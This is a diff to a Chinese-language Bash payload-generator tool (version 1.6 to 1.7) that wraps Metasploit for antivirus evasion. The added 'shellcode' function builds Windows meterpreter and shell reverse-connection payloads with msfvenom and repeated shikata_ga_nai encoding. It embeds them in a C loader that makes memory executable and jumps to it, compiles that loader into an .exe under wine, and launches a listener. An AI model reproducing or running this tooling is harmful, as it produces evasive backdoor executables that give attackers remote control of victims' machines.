@@ -9,8 +9,8 @@
   echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '
 
   echo -e "/==========================########========================\\"
-  echo -e "|                             # v1.6                       |"
-  echo -e "|                        即刻安全周年庆版v1.6              |"
+  echo -e "|                             # v1.7                       |"
+  echo -e "|                        即刻安全周年庆版v1.7              |"
   echo -e "|                        #检查脚本中请稍等.........        |"
   echo -e "|———————————#—————————————————#——————————————————#—————————|"
   echo -e "|                                            Demon 2017    |"
@@ -79,7 +79,7 @@
   echo -e "|               #我的第一个自动化简单小脚本#               |"
   echo -e "|               ##即刻安全博客 www.secist.com              |"
   echo -e "|———————————#—————————————————#——————————————————#—————————|"
-  echo -e "|                即刻安全周年庆版v1.6 | Demon 2017.7.14    |"
+  echo -e "|                即刻安全周年庆版v1.7 | Demon 2017.7.14    |"
   echo -e "\==========================================================/"
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "            你的IP地址 :\c"
@@ -94,7 +94,7 @@
   echo  "#   [5]  bypass_server(powershell)     [6]  ps1encode            #"
   echo  "#   [7]  Avoidz Metasploit PAYLOAD     [8]  nishang_PAYLOAD (NC) #"
   echo  "#   [9]  Avet   Metasploit PAYLOAD     [10] About Me             #"
-  echo  "#   [11] exit                                                    #"
+  echo  "#   [11] shellcode                     [12] exit                 #"
   echo  "################################################################## "
   echo -e "         secist> \c"
   read number
@@ -139,7 +139,7 @@
     echo "set LHOST $ip" >> resource/powershell.rc
     echo "set LPORT $port" >> resource/powershell.rc
     echo "set URIPATH /" >> resource/powershell.rc
-    echo "run" >> resource/powershell.rc
+  #  echo "run" >> resource/powershell.rc
     msfconsole -r resource/powershell.rc
     ;;
     4)
@@ -217,6 +217,9 @@
       menu1
       ;;
     11)
+    shellcode
+    ;;
+    12)
     exit
     ;;
     *)
@@ -238,7 +241,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo "  "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             即刻安全周年庆版v1.6 (secist----2017.7.14)"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            你的IP地址 :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -342,11 +345,11 @@ clear
 echo -e "_______________________________________________________________________"
 echo -e "    我是即刻安全团队的 Demon，平时较活跃于漏洞银行、ichunqiu、等平台。 主要擅长web安全、黑苹果及Kali的渗透测试等。目前专注于metaspolit的研究学习，希望借助本套教程 分享一些我的学习思路和经验。"
 echo -e "    对课程内容有任何疑问，都可通过以下渠道与我们取得联系:  "
-echo      "             即刻安全周年庆版v1.6 (secist----2017.7.14)"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
 echo -e "                     < My Blog: www.ggsec.cn >"
 echo -e "                    < My Team Blog: www.secist.com>"
 echo "                          即刻官方QQ 群：532925486 "
-echo "                           欢迎使用我的脚本 v1.6"
+echo "                           欢迎使用我的脚本 v1.7"
 echo "                         Ps:更改代码请注明原作者                             "
 echo -e "---------------------------------------------------------------------- "
 echo -e "                             \   ^__^             "
@@ -444,7 +447,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo "  "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             即刻安全周年庆版v1.6 (secist----2017.7.14)"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            你的IP地址 :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -516,7 +519,6 @@ elif [ "$option" == "7" ]; then
 fi
 }
 code1(){
-  rm /root/temp1.exe
   echo -e "       secist>请输入你的ip地址: \c"
   read ip
   echo -e "       secist>请输入你的端口: \c"
@@ -531,7 +533,7 @@ code1(){
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-  echo -e "  | OUTPUTNAME ||  The Filename output    || /root/temp1.exe      "
+  echo -e "  | OUTPUTNAME ||  The Filename output    || output/temp1.exe      "
   echo -e "  +------------++-------------------------++-----------------------+"
   echo "use exploit/multi/handler" >> resource/handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
@@ -553,7 +555,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo " "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             即刻安全周年庆版v1.6 (secist----2017.7.14)"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            你的IP地址 :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -828,5 +830,193 @@ echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
 echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
 echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
 echo -e "  +------------++-------------------------++-----------------------+"
+}
+
+shellcode (){
+clear
+
+echo  -e "         < Shellcode Payload >"
+echo  -e "          --------------------"
+echo -e "                             \   ^__^             "
+echo -e "                              \  (oo)\_______     "
+echo -e "                                 (__)\       )\/\ "
+echo -e "                                     ||----w |    "
+echo -e "                                     ||     ||     "
+echo "  "
+echo -e "  +------------++-------------------------++-----------------------+"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
+echo " "
+echo -e "            你的IP地址 :\c"
+/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
+echo "            系统版本 :$(cat /etc/issue)"
+echo -e "  +------------++-------------------------++-----------------------+"
+echo "  "
+echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
+echo "        [2] Meterpreter_Reverse_http	         [6] exit"
+echo "        [3] Meterpreter_Reverse_https		 "
+echo "        [4] Meterpreter_Reverse_tcp_dns          "
+echo "        [7] back meun     "
+echo ""
+echo -e "              secist> \c"
+read option
+
+#Aukeratu
+case $option in
+1)
+payload='windows/meterpreter/reverse_tcp'
+;;
+2)
+payload='windows/meterpreter/reverse_http'
+;;
+3)
+payload='windows/meterpreter/reverse_https'
+;;
+4)
+payload='windows/meterpreter/reverse_tcp_dns'
+;;
+5)
+payload='windows/shell/reverse_tcp'
+;;
+6)
+exit
+;;
+7)
+menu
+;;
+*)
+shellcode
+;;
+esac
+if [ "$option" == "1" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "2" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "3" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "4" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "5" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+ elif [ "$option" == "6" ]; then
+    exit
+
+ elif [ "$option" == "7" ]; then
+    menu
+  fi
+}
+
+shellcode1(){
+#定义了一个菜单为shellcode1
+  echo -e "       secist>请输入你的ip地址: \c"
+  read ip
+  echo -e "       secist>请输入你的端口: \c"
+  read port
+  echo -e "       secist>编码次数(1-500): \c"
+  read encode
+  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=$ip  LPORT=$port -e x86/shikata_ga_nai -b '\x00' -i $encode -f c) | sed 's/unsigned char buf\[\] =//g' >> output/shellcode.txt
+  Shellcode=$(cat output/shellcode.txt)
+  echo  "
+  # include <stdlib.h>
+  # include <stdio.h>
+  # include <string.h>
+
+  # include <windows.h>
+
+
+  int
+  main(void)
+  {
+  	char *shellcode =
+
+    $Shellcode
+
+
+  	DWORD why_must_this_variable;
+  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
+  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);
+
+  	if (!ret) {
+  		printf(\"VirtualProtect\n\");
+  		return EXIT_FAILURE;
+  	}
+  	((void(*)(void))shellcode)();
+
+  	return 0;
+  }
+
+  " >> output/shellcode.cpp
+
+  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
+  rm output/shellcode.txt output/shellcode.cpp
 }
 menu
